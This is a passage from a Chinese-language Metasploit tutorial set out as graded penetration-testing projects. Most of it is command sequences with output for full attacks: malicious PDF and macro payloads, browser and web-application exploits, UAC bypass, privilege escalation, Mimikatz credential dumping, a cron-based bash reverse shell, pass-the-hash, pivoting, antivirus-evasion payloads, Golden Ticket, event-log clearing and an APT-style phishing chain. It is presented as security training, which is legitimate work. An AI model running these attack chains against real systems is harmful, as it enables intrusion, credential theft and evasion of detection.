msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > exploit -j

# 当目标用户打开文档并启用宏时，将获得会话
```

#### 5.1.4 生成恶意 PDF 文件

```bash
# 使用 Adobe PDF 嵌入式 EXE 漏洞
msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set FILENAME malicious.pdf
msf6 exploit(...) > exploit

# 输出：
# [*] Creating 'malicious.pdf' file...
# [+] malicious.pdf stored at /root/.msf4/local/malicious.pdf
```

### 5.2 项目十四：浏览器漏洞利用

**目标**：利用浏览器漏洞获取访问恶意网页的用户系统控制权。

**难度**：★★★★☆

#### 5.2.1 实践步骤

```bash
# 步骤 1：搜索浏览器漏洞模块
msf6 > search type:exploit browser

# 步骤 2：使用 browser_autopwn2 自动化攻击
msf6 > use auxiliary/server/browser_autopwn2
msf6 auxiliary(server/browser_autopwn2) > set LHOST 192.168.1.50
msf6 auxiliary(...) > set SRVPORT 8080
msf6 auxiliary(...) > set URIPATH /
msf6 auxiliary(...) > run

# 输出：
# [*] Starting exploit modules on host 192.168.1.50...
# [*] ---
# [*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload firefox/shell_reverse_tcp
# [*] Using URL: http://192.168.1.50:8080/
# ...

# 将 URL 发送给目标用户，当他们访问时会自动尝试各种浏览器漏洞
```

### 5.3 项目十五：Web 应用漏洞利用

**目标**：利用常见 Web 应用漏洞获取服务器控制权。

**难度**：★★★★☆

#### 5.3.1 Struts2 远程代码执行

```bash
# CVE-2017-5638 (S2-045)
msf6 > search struts2
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set TARGETURI /struts2-showcase/
msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

#### 5.3.2 Jenkins 脚本控制台利用

```bash
# 利用 Jenkins 脚本控制台执行代码
msf6 > use exploit/multi/http/jenkins_script_console
msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set TARGETURI /
msf6 exploit(...) > set USERNAME admin
msf6 exploit(...) > set PASSWORD admin
msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

#### 5.3.3 WordPress 漏洞利用

```bash
# 步骤 1：扫描 WordPress
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 步骤 2：枚举 WordPress 用户
msf6 > use auxiliary/scanner/http/wordpress_login_enum
msf6 auxiliary(scanner/http/wordpress_login_enum) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set TARGETURI /wordpress/
msf6 auxiliary(...) > run

# 步骤 3：利用插件漏洞
msf6 > search wordpress type:exploit
# 选择适合目标版本的漏洞模块
```

### 5.4 项目十六：Windows 本地权限提升

**目标**：在已获得低权限 shell 的情况下，提升到 SYSTEM 权限。

**难度**：★★★★☆

#### 5.4.1 使用 getsystem 命令

```bash
# 在 Meterpreter 会话中
meterpreter > getuid
# Server username: VICTIM\user

meterpreter > getsystem
# ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

#### 5.4.2 使用本地提权漏洞

```bash
# 步骤 1：查找本地提权漏洞
meterpreter > run post/multi/recon/local_exploit_suggester

# 输出示例：
# [*] 192.168.1.101 - Collecting local exploits for x64/windows...
# [*] 192.168.1.101 - 37 exploit checks are being tried...
# [+] 192.168.1.101 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
# [+] 192.168.1.101 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.

# 步骤 2：使用建议的漏洞模块
meterpreter > background
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 5555
msf6 exploit(...) > exploit

# 成功后获得 SYSTEM 权限的新会话
```

#### 5.4.3 绕过 UAC

```bash
# 方法 1：使用 bypassuac 模块
msf6 > use exploit/windows/local/bypassuac
msf6 exploit(windows/local/bypassuac) > set SESSION 1
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 5555
msf6 exploit(...) > exploit

# 方法 2：使用 bypassuac_eventvwr
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > exploit

# 方法 3：使用 bypassuac_fodhelper
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > exploit
```

### 5.5 项目十七：Linux 本地权限提升

**目标**：在已获得低权限 shell 的情况下，提升到 root 权限。

**难度**：★★★★☆

#### 5.5.1 使用本地提权漏洞建议器

```bash
# 在 Meterpreter 会话中
meterpreter > run post/multi/recon/local_exploit_suggester

# 或者使用专门的 Linux 模块
meterpreter > background
msf6 > use post/linux/gather/enum_system
msf6 post(linux/gather/enum_system) > set SESSION 1
msf6 post(...) > run
```

#### 5.5.2 常见 Linux 提权漏洞

```bash
# Dirty COW (CVE-2016-5195)
msf6 > use exploit/linux/local/dirtycow
msf6 exploit(linux/local/dirtycow) > set SESSION 1
msf6 exploit(...) > exploit

# PwnKit (CVE-2021-4034)
msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > exploit

# Sudo 漏洞 (CVE-2021-3156)
msf6 > use exploit/linux/local/sudo_baron_samedit
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > exploit
```

### 5.6 项目十八：密码获取与哈希破解

**目标**：从目标系统获取密码哈希并尝试破解。

**难度**：★★★★☆

#### 5.6.1 Windows 密码获取

```bash
# 方法 1：使用 hashdump
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# user:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# 方法 2：使用 Kiwi (Mimikatz)
meterpreter > load kiwi
meterpreter > creds_all

# 输出示例：
# [+] Running as SYSTEM
# [*] Retrieving all credentials
# msv credentials
# ===============
# Username  Domain   LM                                NTLM                              SHA1
# --------  ------   --                                ----                              ----
# user      VICTIM   aad3b435b51404eeaad3b435b51404ee  e19ccf75ee54e06b06a5907af13cef42  ...

# wdigest credentials
# ===================
# Username  Domain   Password
# --------  ------   --------
# user      VICTIM   Password123!

# 方法 3：导出 SAM 和 SYSTEM 文件
meterpreter > run post/windows/gather/smart_hashdump
```

#### 5.6.2 Linux 密码获取

```bash
# 获取 /etc/shadow 文件
meterpreter > cat /etc/shadow

# 或使用后渗透模块
meterpreter > run post/linux/gather/hashdump

# 输出示例：
# root:$6$xxxxx$yyyyy:18000:0:99999:7:::
# user:$6$aaaaa$bbbbb:18000:0:99999:7:::
```

#### 5.6.3 使用 John the Ripper 破解哈希

```bash
# 保存哈希到文件
echo "user:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::" > hashes.txt

# 使用 John 破解
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 查看破解结果
john --show hashes.txt
```

---

## 6. 专家级实践项目

这一部分的项目涉及高级攻击技术，包括持久化、横向移动和免杀技术。

### 6.1 项目十九：持久化访问

**目标**：在目标系统上建立持久化后门，确保重启后仍能访问。

**难度**：★★★★★

#### 6.1.1 Windows 持久化

```bash
# 方法 1：使用 persistence 脚本
meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.50

# 参数说明：
# -U: 用户登录时启动
# -i 60: 每 60 秒尝试连接
# -p 4444: 连接端口
# -r: 攻击者 IP

# 方法 2：使用注册表持久化
meterpreter > run post/windows/manage/persistence_exe
# 或
msf6 > use exploit/windows/local/persistence
msf6 exploit(windows/local/persistence) > set SESSION 1
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set STARTUP SYSTEM
msf6 exploit(...) > exploit

# 方法 3：使用计划任务
meterpreter > run post/windows/manage/persistence_exe STARTUP=TASK
```

#### 6.1.2 Linux 持久化

```bash
# 方法 1：SSH 密钥持久化
meterpreter > run post/linux/manage/sshkey_persistence

# 方法 2：Cron 任务持久化
meterpreter > shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'" >> /var/spool/cron/crontabs/root

# 方法 3：使用后渗透模块
msf6 > use exploit/linux/local/service_persistence
msf6 exploit(linux/local/service_persistence) > set SESSION 1
msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

### 6.2 项目二十：横向移动

**目标**：从已控制的系统移动到网络中的其他系统。

**难度**：★★★★★

#### 6.2.1 使用 Pass-the-Hash 攻击

```bash
# 步骤 1：获取目标系统的哈希
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# 步骤 2：使用 psexec 模块进行 Pass-the-Hash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.102
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

#### 6.2.2 使用 WMI 横向移动

```bash
msf6 > use exploit/windows/local/wmi
msf6 exploit(windows/local/wmi) > set RHOSTS 192.168.1.102
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass Password123!
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

#### 6.2.3 使用 Meterpreter 进行网络枢纽

```bash
# 步骤 1：在已控制的系统上添加路由
meterpreter > run autoroute -s 10.0.0.0/24

# 或使用 post 模块
meterpreter > background
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(...) > set SUBNET 10.0.0.0
msf6 post(...) > set NETMASK /24
msf6 post(...) > run

# 步骤 2：设置 SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(...) > set VERSION 4a
msf6 auxiliary(...) > run -j

# 步骤 3：配置 proxychains
# 编辑 /etc/proxychains.conf
# socks4 127.0.0.1 1080

# 步骤 4：通过代理扫描内网
proxychains nmap -sT -Pn 10.0.0.0/24

# 步骤 5：通过代理攻击内网目标
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 10.0.0.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 exploit(...) > exploit
```

#### 6.2.4 横向移动流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                      横向移动攻击流程                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   外网                    DMZ                    内网           │
│                                                                 │
│   ┌─────────┐         ┌─────────┐         ┌─────────┐          │
│   │ 攻击者  │────────►│ Web服务器│────────►│ 数据库  │          │
│   │         │  漏洞   │ (已控制) │  横向   │ 服务器  │          │
│   └─────────┘  利用   └─────────┘  移动   └─────────┘          │
│                            │                    │               │
│                            │ 添加路由           │               │
│                            ▼                    ▼               │
│                       ┌─────────┐         ┌─────────┐          │
│                       │ 域控制器│◄────────│ 文件    │          │
│                       │         │  凭证   │ 服务器  │          │
│                       └─────────┘  传递   └─────────┘          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.3 项目二十一：免杀技术

**目标**：生成能够绑过杀毒软件检测的 Payload。

**难度**：★★★★★

#### 6.3.1 使用 MSFvenom 编码

```bash
# 基础编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -e x86/shikata_ga_nai -i 10 -f exe > payload.exe

# 参数说明：
# -e: 编码器
# -i: 编码迭代次数
# -f: 输出格式

# 多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 \
    -e x86/countdown -i 3 \
    -e x86/call4_dword_xor -i 2 \
    -f exe > payload_multi.exe
```

#### 6.3.2 使用模板注入

```bash
# 将 Payload 注入到合法程序中
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -x /path/to/legitimate.exe \
    -k \
    -f exe > injected.exe

# 参数说明：
# -x: 模板文件
# -k: 保持模板功能
```

#### 6.3.3 使用 Evasion 模块

```bash
# Metasploit 6.x 引入了 Evasion 模块
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(windows/windows_defender_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 evasion(...) > set LHOST 192.168.1.50
msf6 evasion(...) > set LPORT 4444
msf6 evasion(...) > set FILENAME defender_bypass.exe
msf6 evasion(...) > run

# 查看所有 Evasion 模块
msf6 > show evasion
```

#### 6.3.4 使用 Shellcode 注入

```bash
# 生成原始 Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f c > shellcode.c

# 生成 Python 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f python > shellcode.py

# 生成 PowerShell 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
    -f psh > shellcode.ps1

# 然后使用自定义加载器执行 Shellcode
```

### 6.4 项目二十二：域渗透

**目标**：在 Active Directory 环境中进行渗透测试。

**难度**：★★★★★

#### 6.4.1 域信息收集

```bash
# 在 Meterpreter 中收集域信息
meterpreter > run post/windows/gather/enum_domain

# 枚举域用户
meterpreter > run post/windows/gather/enum_domain_users

# 枚举域组
meterpreter > run post/windows/gather/enum_domain_group_users

# 枚举域控制器
meterpreter > run post/windows/gather/enum_domain_controllers

# 使用 PowerShell 收集信息
meterpreter > load powershell
meterpreter > powershell_execute "Get-ADDomain"
meterpreter > powershell_execute "Get-ADUser -Filter *"
```

#### 6.4.2 Kerberos 攻击

```bash
# Kerberoasting - 获取服务账户的 TGS 票据
meterpreter > load kiwi
meterpreter > kerberos_ticket_list

# 使用 post 模块
msf6 > use post/windows/gather/kerberos_enumusers
msf6 post(...) > set SESSION 1
msf6 post(...) > run

# 导出票据用于离线破解
meterpreter > kiwi_cmd "kerberos::list /export"
```

#### 6.4.3 Golden Ticket 攻击

```bash
# 步骤 1：获取 krbtgt 账户的 NTLM 哈希
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# 步骤 2：获取域 SID
meterpreter > run post/windows/gather/enum_domain

# 步骤 3：创建 Golden Ticket
meterpreter > golden_ticket_create -d domain.local -u Administrator -s S-1-5-21-xxx -k <krbtgt_hash> -t /tmp/golden.kirbi

# 步骤 4：使用 Golden Ticket
meterpreter > kerberos_ticket_use /tmp/golden.kirbi
```

---

## 7. 红队实战项目

这一部分模拟真实的红队渗透测试场景，综合运用前面学到的所有技术。

### 7.1 项目二十三：完整渗透测试流程

**目标**：模拟完整的渗透测试流程，从信息收集到报告生成。

**难度**：★★★★★

#### 7.1.1 阶段一：信息收集

```bash
# 1. 创建工作区
msf6 > workspace -a pentest_project

# 2. 被动信息收集
msf6 > use auxiliary/gather/search_email_collector
msf6 auxiliary(...) > set DOMAIN target.com
msf6 auxiliary(...) > run

# 3. 主动扫描
msf6 > db_nmap -sS -sV -O -A 192.168.1.0/24

# 4. 查看收集的信息
msf6 > hosts
msf6 > services
msf6 > vulns
```

#### 7.1.2 阶段二：漏洞分析

```bash
# 1. 运行漏洞扫描
msf6 > vulns -R  # 显示所有漏洞

# 2. 使用 autopwn 自动匹配漏洞
msf6 > analyze

# 3. 手动验证关键漏洞
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run
```

#### 7.1.3 阶段三：漏洞利用

```bash
# 1. 选择最佳攻击路径
# 2. 执行漏洞利用
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# 3. 获得初始访问
meterpreter > sysinfo
meterpreter > getuid
```

#### 7.1.4 阶段四：后渗透

```bash
# 1. 权限提升
meterpreter > getsystem

# 2. 信息收集
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_shares

# 3. 凭证获取
meterpreter > load kiwi
meterpreter > creds_all

# 4. 持久化
meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.50

# 5. 横向移动
meterpreter > run autoroute -s 10.0.0.0/24
```

#### 7.1.5 阶段五：清理与报告

```bash
# 1. 清理痕迹
meterpreter > clearev  # 清除事件日志

# 2. 导出数据库
msf6 > db_export -f xml pentest_report.xml

# 3. 生成报告
# 使用导出的数据生成渗透测试报告
```

### 7.2 项目二十四：APT 模拟攻击

**目标**：模拟高级持续性威胁（APT）攻击场景。

**难度**：★★★★★

#### 7.2.1 攻击链概述

```
┌─────────────────────────────────────────────────────────────────┐
│                      APT 攻击链 (Kill Chain)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 侦察 (Reconnaissance)                                      │
│      └── 收集目标信息、员工邮箱、社交媒体                       │
│                                                                 │
│   2. 武器化 (Weaponization)                                     │
│      └── 制作恶意文档、钓鱼邮件                                 │
│                                                                 │
│   3. 投递 (Delivery)                                            │
│      └── 发送钓鱼邮件、水坑攻击                                 │
│                                                                 │
│   4. 利用 (Exploitation)                                        │
│      └── 用户打开恶意文档，触发漏洞                             │
│                                                                 │
│   5. 安装 (Installation)                                        │
│      └── 安装后门、建立持久化                                   │
│                                                                 │
│   6. 命令与控制 (C2)                                            │
│      └── 建立隐蔽通信通道                                       │
│                                                                 │
│   7. 目标达成 (Actions on Objectives)                           │
│      └── 数据窃取、横向移动、破坏                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 7.2.2 实践步骤

```bash
# 阶段 1：制作钓鱼文档
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 \
    -f vba-psh > macro.txt

# 阶段 2：设置 HTTPS 监听器
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 443
msf6 exploit(...) > set ExitOnSession false
msf6 exploit(...) > exploit -j

# 阶段 3：等待目标上线后进行后渗透
meterpreter > sysinfo
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_all

# 阶段 4：建立持久化
meterpreter > run persistence -U -i 300 -p 443 -r 192.168.1.50

# 阶段 5：横向移动到高价值目标
meterpreter > run autoroute -s 10.0.0.0/24
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS 10.0.0.10
msf6 exploit(...) > set SMBUser Administrator
msf6 exploit(...) > set SMBPass <hash>
msf6 exploit(...) > exploit
```

---

## 8. 自动化与脚本开发

### 8.1 资源脚本（RC Scripts）

资源脚本是 Metasploit 的自动化利器，可以将一系列命令保存为脚本文件，实现自动化执行。

#### 8.1.1 创建资源脚本

```bash
# 方法 1：手动创建
# 创建文件 auto_scan.rc
cat > auto_scan.rc << 'EOF'
# 自动化扫描脚本
workspace -a auto_scan
db_nmap -sS -sV -O 192.168.1.0/24
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 50
run
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
hosts
services
vulns
EOF

# 方法 2：从命令历史创建
msf6 > makerc /tmp/my_script.rc
```

#### 8.1.2 执行资源脚本

```bash
# 在 msfconsole 中执行
msf6 > resource auto_scan.rc

# 启动时执行
msfconsole -r auto_scan.rc

# 执行多个脚本
msfconsole -r script1.rc -r script2.rc
```

#### 8.1.3 实用资源脚本示例

```bash
# 自动化漏洞利用脚本 (exploit_ms17010.rc)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
set ExitOnSession false
exploit -j

# 自动化后渗透脚本 (post_exploit.rc)
# 在获得会话后执行
sessions -i 1
sysinfo
getuid
getsystem
hashdump
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
background
```

### 8.2 使用 Ruby 编写自定义模块

Metasploit 使用 Ruby 语言编写，你可以创建自定义模块来扩展其功能。

#### 8.2.1 辅助模块模板

```ruby
# 保存到 ~/.msf4/modules/auxiliary/scanner/custom/my_scanner.rb

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Scanner',
      'Description'    => %q{
        This is a custom scanner module example.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80),
      OptString.new('TARGETURI', [true, 'The target URI', '/'])
    ])
  end

  def run_host(ip)
    begin
      connect
      print_status("Connected to #{ip}:#{rport}")
      
      # 你的扫描逻辑
      sock.put("GET #{datastore['TARGETURI']} HTTP/1.1\r\nHost: #{ip}\r\n\r\n")
      response = sock.get_once
      
      if response && response.include?('200 OK')
        print_good("#{ip}:#{rport} - Target is accessible")
        report_host(host: ip)
      end
      
      disconnect
    rescue ::Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end
end
```

#### 8.2.2 漏洞利用模块模板

```ruby
# 保存到 ~/.msf4/modules/exploits/custom/my_exploit.rb

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Exploit',
      'Description'    => %q{
        This is a custom exploit module example.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        => [
        ['Linux x86', { 'Ret' => 0x08048000 }]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-01-01'
    ))

    register_options([
      Opt::RPORT(9999)
    ])
  end

  def check
    # 检查目标是否存在漏洞
    connect
    banner = sock.get_once
    disconnect
    
    if banner && banner.include?('Vulnerable Service')
      return Exploit::CheckCode::Vulnerable
    end
    
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect
    
    # 构造漏洞利用数据
    buffer = "A" * 100
    buffer << [target.ret].pack('V')
    buffer << payload.encoded
    
    print_status("Sending exploit...")
    sock.put(buffer)
    
    handler
    disconnect
  end
end
```

### 8.3 使用 Metasploit RPC API

Metasploit 提供了 RPC API，可以通过编程方式控制 Metasploit。

#### 8.3.1 启动 RPC 服务

```bash
# 启动 msfrpcd
msfrpcd -P yourpassword -S -a 127.0.0.1

# 参数说明：
# -P: 密码
# -S: 使用 SSL
# -a: 监听地址
```

#### 8.3.2 Python 客户端示例

```python
#!/usr/bin/env python3
# msf_client.py

from pymetasploit3.msfrpc import MsfRpcClient

# 连接到 Metasploit RPC
client = MsfRpcClient('yourpassword', ssl=True)

# 获取版本信息
print(f"Metasploit Version: {client.core.version}")

# 搜索模块
modules = client.modules.search('ms17-010')
for mod in modules:
    print(f"Found: {mod['fullname']}")

# 使用漏洞利用模块
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.100'
exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
exploit['LHOST'] = '192.168.1.50'
exploit['LPORT'] = 4444

# 执行漏洞利用
result = exploit.execute()
print(f"Job ID: {result['job_id']}")

# 列出会话
sessions = client.sessions.list
for sid, session in sessions.items():
    print(f"Session {sid}: {session['info']}")
```

---

## 9. 常见错误与解决方案

这一部分汇总了使用 Metasploit 过程中最常见的错误及其解决方案。

### 9.1 数据库相关错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Database not connected` | PostgreSQL 未启动或未配置 | `sudo msfdb init` 或 `sudo systemctl start postgresql` |
| `could not connect to server` | 数据库服务未运行 | `sudo systemctl start postgresql` |
| `FATAL: role "msf" does not exist` | 数据库用户未创建 | `sudo msfdb reinit` |
| `database.yml not found` | 配置文件缺失 | `sudo msfdb init` |

```bash
# 数据库问题通用解决流程
sudo systemctl stop postgresql
sudo msfdb delete
sudo msfdb init
sudo systemctl start postgresql
msfconsole
msf6 > db_status
```

### 9.2 漏洞利用相关错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Exploit completed, but no session was created` | 多种可能原因 | 见下方详细分析 |
| `RHOSTS is not set` | 未设置目标主机 | `set RHOSTS <IP>` |
| `LHOST is not set` | 未设置监听地址 | `set LHOST <IP>` |
| `Handler failed to bind` | 端口被占用 | 更换 LPORT 或关闭占用进程 |
| `Connection refused` | 目标端口未开放 | 确认目标服务运行 |
| `Target is not vulnerable` | 目标已打补丁 | 尝试其他攻击向量 |

#### 9.2.1 "No session created" 详细分析

```bash
# 可能原因 1：防火墙阻止反向连接
# 解决：使用 bind_tcp 而不是 reverse_tcp
set PAYLOAD windows/meterpreter/bind_tcp

# 可能原因 2：Payload 架构不匹配
# 解决：确认目标系统架构
# 64位系统：windows/x64/meterpreter/reverse_tcp
# 32位系统：windows/meterpreter/reverse_tcp

# 可能原因 3：杀毒软件拦截
# 解决：使用编码或免杀技术
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# 可能原因 4：目标选择错误（MS08-067 等）
# 解决：使用正确的 TARGET
show targets
set TARGET <correct_id>

# 可能原因 5：网络问题
# 解决：检查网络连通性
# 在攻击机上：ping <target_ip>
# 确认 LHOST 设置正确（攻击机 IP，不是 127.0.0.1）
```

### 9.3 Meterpreter 相关错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Session X is not valid` | 会话已断开 | 重新获取会话 |
| `Operation failed: Access is denied` | 权限不足 | 尝试 `getsystem` 提权 |
| `stdapi_sys_config_getsid: Operation failed` | 进程权限问题 | 迁移到其他进程 |
| `Meterpreter session X closed` | 会话意外断开 | 检查网络稳定性，使用持久化 |
| `migrate: Operation failed` | 目标进程不兼容 | 选择相同架构的进程 |

```bash
# 会话稳定性问题解决
# 1. 迁移到稳定进程
meterpreter > ps
meterpreter > migrate <stable_process_pid>

# 推荐迁移目标：
# Windows: explorer.exe, svchost.exe, winlogon.exe
# 注意：迁移到 64 位进程需要 64 位 Payload

# 2. 设置会话超时
msf6 > set SessionCommunicationTimeout 0
msf6 > set SessionExpirationTimeout 0

# 3. 使用更稳定的 Payload
# reverse_https 比 reverse_tcp 更稳定
set PAYLOAD windows/meterpreter/reverse_https
```

### 9.4 网络相关错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Rex::ConnectionRefused` | 目标端口未开放 | 确认服务运行 |
| `Rex::ConnectionTimeout` | 网络不通或防火墙 | 检查网络连通性 |
| `Rex::HostUnreachable` | 无法到达目标 | 检查路由配置 |
| `ECONNRESET` | 连接被重置 | 目标服务崩溃或防火墙 |

```bash
# 网络问题排查步骤
# 1. 检查基本连通性
ping <target_ip>

# 2. 检查端口开放
nmap -p <port> <target_ip>

# 3. 检查防火墙规则
# 在攻击机上确保监听端口开放
sudo iptables -L

# 4. 使用不同端口
# 常见可用端口：80, 443, 8080, 53
set LPORT 443
```

### 9.5 模块相关错误

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Module not found` | 模块路径错误或不存在 | 使用 `search` 查找正确路径 |
| `Invalid option` | 参数名称错误 | 使用 `show options` 查看正确参数 |
| `Required option missing` | 必需参数未设置 | 设置所有必需参数 |
| `Incompatible payload` | Payload 与模块不兼容 | 使用 `show payloads` 查看兼容 Payload |

```bash
# 模块问题排查
# 1. 更新模块数据库
msf6 > reload_all

# 2. 搜索正确模块
msf6 > search <keyword>

# 3. 查看模块信息
msf6 > info <module_path>

# 4. 查看兼容 Payload
msf6 > show payloads
```

### 9.6 权限相关错误

```bash
# 错误：Operation requires elevation
# 原因：需要管理员/root 权限
# 解决：
sudo msfconsole

# 错误：getsystem failed
# 原因：当前权限不足以提权
# 解决：
